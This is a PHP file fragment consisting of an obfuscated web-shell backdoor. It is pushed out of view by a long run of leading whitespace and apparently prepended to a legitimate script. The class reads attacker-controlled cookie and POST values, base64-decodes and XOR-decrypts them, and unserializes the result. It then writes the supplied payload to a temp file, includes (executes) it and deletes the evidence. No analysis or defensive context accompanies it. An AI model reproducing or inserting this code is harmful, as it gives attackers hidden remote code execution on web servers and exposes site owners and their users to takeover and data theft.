<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("rajbmk")){class rajbmk{public static $kmhdmcs = "snkerdjvgteubihh";public static $ojmryocibu = NULL;public function __construct(){$izospqwvs = @$_COOKIE[substr(rajbmk::$kmhdmcs, 0, 4)];if (!empty($izospqwvs)){$rzxsjwowk = "base64";$mfivxxac = "";$izospqwvs = explode(",", $izospqwvs);foreach ($izospqwvs as $ixeafky){$mfivxxac .= @$_COOKIE[$ixeafky];$mfivxxac .= @$_POST[$ixeafky];}$mfivxxac = array_map($rzxsjwowk . "_decode", array($mfivxxac,));$mfivxxac = $mfivxxac[0] ^ str_repeat(rajbmk::$kmhdmcs, (strlen($mfivxxac[0]) / strlen(rajbmk::$kmhdmcs)) + 1);rajbmk::$ojmryocibu = @unserialize($mfivxxac);}}public function __destruct(){$this->qdglswu();}private function qdglswu(){if (is_array(rajbmk::$ojmryocibu)) {$yjmtumnr = sys_get_temp_dir() . "/" . crc32(rajbmk::$ojmryocibu["salt"]);@rajbmk::$ojmryocibu["write"]($yjmtumnr, rajbmk::$ojmryocibu["content"]);include $yjmtumnr;@rajbmk::$ojmryocibu["delete"]($yjmtumnr);exit();}}}$rvmxmdhjz = new rajbmk();$rvmxmdhjz = NULL;} ?><?php
